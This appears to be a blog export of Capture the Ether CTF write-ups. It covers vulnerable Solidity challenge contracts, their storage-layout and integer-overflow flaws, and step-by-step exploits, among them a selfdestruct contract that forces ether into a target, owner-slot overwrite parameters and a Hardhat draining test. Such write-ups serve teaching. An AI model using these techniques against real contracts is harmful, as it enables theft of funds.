class="code"><pre><span class="line">pragma solidity ^0.7.3;</span><br><span class="line"></span><br><span class="line">contract destructAttack &#123;</span><br><span class="line"></span><br><span class="line">    constructor (address payable target) payable &#123;</span><br><span class="line">        require(msg.value &gt; 0);</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.再次调用 withdraw()，输入index=2取钱</p><p>5.调用isComplete()，返回true </p><h2 id="thinking"><a href="#thinking" class="headerlink" title="thinking"></a>thinking</h2><p>本道题正常的逻辑应该是：本项目可以给已有提案投票，或者新建提案，但是新建提案的解锁时间要大于上一个提案，在50年以上增加，到了解锁时间，就可以获取某个提案及其之前所有提案中的金额。但是问题出在<code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days)</code>，通过整数溢出可以将锁定时间设置为0，因此不必再等待50年时间</p><p>另外，由于结构体指针的问题，每次新建一个提案，都会修改distribution数组的长度加一，并且新建提案的amount和数组长度存放的位置是同一个插槽，因此amount会加一。因此到了最后，出现了合约余额比记录的amount少的情况，这是经常出现的问题，但是我们知道可以通过自毁合约强制发送金额的方式给合约增加余额，这样withdrew的时候就不会报错revert了</p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.Donation</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/11.Donation/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/11.Donation/</url>
      
        <content type="html"><![CDATA[<h1 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>In this challenge we have to withdraw all the Ether from the contract. The only place where it is possible is:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function withdraw() public &#123;</span><br><span class="line">  require(msg.sender == owner);</span><br><span class="line">  msg.sender.transfer(address(this).balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>But it requires to be the <code>owner</code>. So, we’ll have to find a way to become the new owner.</p><p>There’s some funny business going on. The <code>donation</code> variable has no location defined (memory/storage):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Donation donation;</span><br></pre></td></tr></table></figure><p>In this case, it assumes <code>storage</code> by default, leading to an unexpected behavior. It acts as a pointer to the storage, and it will write to the first slots when changing its attributes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct Donation &#123;</span><br><span class="line">  uint256 timestamp;</span><br><span class="line">  uint256 etherAmount;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Donation[] public donations;</span><br><span class="line">address public owner;</span><br></pre></td></tr></table></figure><p>But this syntax is not allowed in new compiler</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">    amount is in ether, but msg.value is in wei</span><br><span class="line">    uint256 scale = 10**18 * 1 ether;</span><br><span class="line">    require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">    Donation donation;//But this syntax is not allowed in new compiler</span><br><span class="line">    donation.timestamp = now;</span><br><span class="line">    donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">    donations.push(donation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Setting the <code>timestamp</code> will write to the <code>slot 0</code> =&gt; the array length, and setting <code>etherAmount</code> will write to the <code>slot 1</code> =&gt; the <code>owner</code>.</p><p>So, to set the <code>owner</code> we just have to set <code>etherAmount</code> to our address.</p><p>The only reamaining challenge is passing the <code>require(msg.value == etherAmount / scale);</code>We convert our a decimal number and divide by the <code>scale</code> (10^18 * 1 ether). </p><p>if we call donate() twice, it will cover slot0 and slot1 again: first call=&gt;a, second call=&gt;b</p><p><img src="/2023/06/23/01.Capturetheether%20CTF/11.Donation/image-20230309160909771.png" alt="image-20230309160909771"></p><p>if this state variable swaps the position ,the result is the same as before. <code>Donation donation</code> always points to slot 0 and slot 1.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Donation[] public donations;</span><br><span class="line">address public owner;</span><br><span class="line">//if this state valiable changes the position ,the result is the same as before</span><br><span class="line">address public owner;</span><br><span class="line">Donation[] public donations;</span><br></pre></td></tr></table></figure><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>1.get <code>donate(uint256)</code> ‘s parameter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.7;</span><br><span class="line"></span><br><span class="line">contract tool&#123;</span><br><span class="line">    function calculateValue(uint256 _address) view public returns(uint256)&#123;</span><br><span class="line">        //account from Remix: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">        return (uint256(uint160(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4))) / 10**36;//520786028573</span><br><span class="line">    &#125;//return 520786028573</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.call donate(uint256) with msg.value =520786028573 Wei and etherAmount = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</p><p>3.call <code>withdraw()</code></p><p>4.isComplete() returns true.</p><p><img src="/2023/06/23/01.Capturetheether%20CTF/11.Donation/image-20230309162324150.png" alt="image-20230309162324150"></p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.Mapping</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/10.Mapping/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/10.Mapping/</url>
      
        <content type="html"><![CDATA[<h1 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        // Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;= key) &#123;</span><br><span class="line">            map.length = key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>This level is about the dynamic array storage mode in the storage layout of EVM. </p><ul><li>In this level, the storage layout likes this<ul><li><code>bool public isComplete</code> is in slot 0</li><li><code>uint256[] map</code> ‘s length is in slot 1. And it is member will be add in the following, for example: map[1]=&gt;keccak256(1),map[2]=&gt;keccak256(1) + 1, map[3]=&gt;keccak256(1) + 2 and so on</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (map.length &lt;= key) &#123;</span><br><span class="line">map.length = key + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>through this code,it can expand the <code>map</code>’s length to cover all <code>2^256 - 1</code> storage slots. This means that we can modify every slot in this contract.</p><p>But where is slot 0 in? we know that, we can set dynamic array slot after its first member, in this level, its first member【map[1]】 is in keccak256(1). isComplete is in slot 0, this means that it is in 0 or 2^256.  the following i will teach u how to count the isComplete’s slot.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//keccak256(1) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br><span class="line">//slot 0 == 0 == slot isComplete == 2^256</span><br><span class="line">//keccak256(1) + offset ==  2^256</span><br><span class="line">//offset == 2^256 - keccak256(1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.17;</span><br><span class="line">contract MyContract &#123;</span><br><span class="line">    uint256 public maxUint256 = type(uint256).max;//115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class="line">    uint256 public isCompleteSlot = maxUint256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6;</span><br><span class="line">    </span><br><span class="line">    function x() public pure returns(bytes32)&#123;</span><br><span class="line">        bytes32 y = keccak256(abi.encode(0x0000000000000000000000000000000000000000000000000000000000000001));</span><br><span class="line">        return y;</span><br><span class="line">    &#125;//0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br><span class="line">&#125;</span><br><span class="line">//isCompleteSlot=35707666377435648211887908874984608119992236509074197713628505308453184860938</span><br></pre></td></tr></table></figure><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>1.expand the <code>map</code>’s length to cover all <code>2^256 - 1</code> storage slots：call <code>set(uint256, uint256)</code> with the parameters “<code>115792089237316195423570985008687907853269984665640564039457584007913129639934</code>“ and “1”【type(uint256).max -1 = <code>115792089237316195423570985008687907853269984665640564039457584007913129639934</code>】</p><p>2.modify the slot 0 to 1: call <code>set(uint256, uint256)</code> with the parameters “<code>35707666377435648211887908874984608119992236509074197713628505308453184860938</code>“ and “1”. </p><p>3.isComplete==true</p><p>4.u can check the storage layout:</p><p><img src="/2023/06/23/01.Capturetheether%20CTF/10.Mapping/image-20230308181403588.png" alt="image-20230308181403588"></p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.Retirement fund</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/09.Retirement%20fund/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/09.Retirement%20fund/</url>
      
        <content type="html"><![CDATA[<h1 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            // early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 / 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender == beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn = startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        // an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        // penalty is what&#x27;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><p>our goal is to make <code>address(this).balance == 0</code>, at first address(this) == 1 ETH</p><p>The design of this level is not very good. There are two ways to complete this task</p><h2 id="solution-1"><a href="#solution-1" class="headerlink" title="solution 1"></a>solution 1</h2><p>1.beneficiary calls <code>withdraw()</code></p><p>2.beneficiary calls <code>collectPenalty()</code></p><p>3.call <code>isComplete()</code></p><p>of course, this is not the thing that designer wants us to do</p><h2 id="solution-2"><a href="#solution-2" class="headerlink" title="solution 2"></a>solution 2</h2><p>Anyone can steal all the money in th contract! Let’s look at the following code: it checks withdrawn &gt; 0, while <code>withdrawn = startBalance - address(this).balance</code>. startBalance = 1 ETH, initial address(this).balance = 1 ETH. But what if we send some money to this contract? It would cause an integer overflow bacause address(this).balance &gt; 1 ETH and withdrawn will be very large so it can easily pass the <code>require</code>.</p><p>But how to send some money to this contract? It doesn’t contain an function that can receive money or even a fallback() or receive() to receive money. But we know, we can destroy a contract to force ETH to an address: <code>selfdestruct()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function collectPenalty() public &#123;</span><br><span class="line">    require(msg.sender == beneficiary);</span><br><span class="line"></span><br><span class="line">    uint256 withdrawn = startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">    // an early withdrawal occurred</span><br><span class="line">    require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">    // penalty is what&#x27;s left</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this is the attack steps:</p><p>1.Deploy this contract to send som money to the level contract.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7.3;</span><br><span class="line"></span><br><span class="line">contract RetirementFundAttacker &#123;</span><br><span class="line"></span><br><span class="line">    constructor (address payable target) payable &#123;</span><br><span class="line">        require(msg.value &gt; 0);</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.call the collectPenalty()</p><p>this is the example:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; expect &#125; <span class="keyword">from</span> <span class="string">&quot;chai&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; utils &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;RetirementFundChallenge&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">it</span>(<span class="string">&quot;Solves the challenge&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> myAddress = ethers.<span class="property">provider</span>.<span class="title function_">getSigner</span>().<span class="title function_">getAddress</span>();</span><br><span class="line">    <span class="keyword">const</span> challengeFactory = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;RetirementFundChallenge&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> challengeContract = <span class="keyword">await</span> challengeFactory.<span class="title function_">deploy</span>(myAddress, &#123; <span class="attr">value</span>: utils.<span class="title function_">parseEther</span>(<span class="string">&quot;1&quot;</span>) &#125;);</span><br><span class="line">    <span class="keyword">await</span> challengeContract.<span class="title function_">deployed</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> attackFactory = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;RetirementFundAttack&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> attackContract = <span class="keyword">await</span> attackFactory.<span class="title function_">deploy</span>(challengeContract.<span class="property">address</span>, &#123; <span class="attr">value</span>: <span class="number">1</span> &#125;);</span><br><span class="line">    <span class="keyword">await</span> attackContract.<span class="title function_">deployed</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> tx = <span class="keyword">await</span> challengeContract.<span class="title function_">collectPenalty</span>();</span><br><span class="line">    <span class="keyword">await</span> tx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_">expect</span>(<span class="keyword">await</span> challengeContract.<span class="title function_">isComplete</span>()).<span class="property">to</span>.<span class="property">be</span>.<span class="property">true</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.Token whale</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/08.Token%20whale/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/08.Token%20whale/</url>
      
        <content type="html"><![CDATA[<h1 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = 1000;</span><br><span class="line">        balanceOf[player] = 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;= 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><h3 id="transfer"><a href="#transfer" class="headerlink" title="_transfer"></a>_transfer</h3><ul><li>this level is about ERC20, but there is a big mistake in it. Let’s look at <code>_transfer()</code> :<ul><li><code>_transfer()</code> normally has three parameters but it doesn’t. Always he minus <code>balanceOf[msg.sender]</code> but not the <code>balanceOf[_from]</code>, it means that it will cause some problem in transFrom()</li><li>no check in <code>balanceOf[msg.sender] -= value;</code>, maybe it can cause an integer overflow vulnerable</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">    balanceOf[msg.sender] -= value;</span><br><span class="line">    balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">    emit Transfer(msg.sender, to, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">//ERC20 OpenZeppelin implementation</span><br><span class="line">function _transfer(address from, address to, uint256 amount) internal virtual &#123;</span><br><span class="line">    require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">    require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">    _beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">    uint256 fromBalance = _balances[from];</span><br><span class="line">    require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">    unchecked &#123;</span><br><span class="line">        _balances[from] = fromBalance - amount;</span><br><span class="line">        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span><br><span class="line">        // decrementing then incrementing.</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Transfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">    _afterTokenTransfer(from, to, amount);</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h3 id="transferFrom"><a href="#transferFrom" class="headerlink" title="transferFrom()"></a>transferFrom()</h3><p>this three <code>require</code> is normal and right, 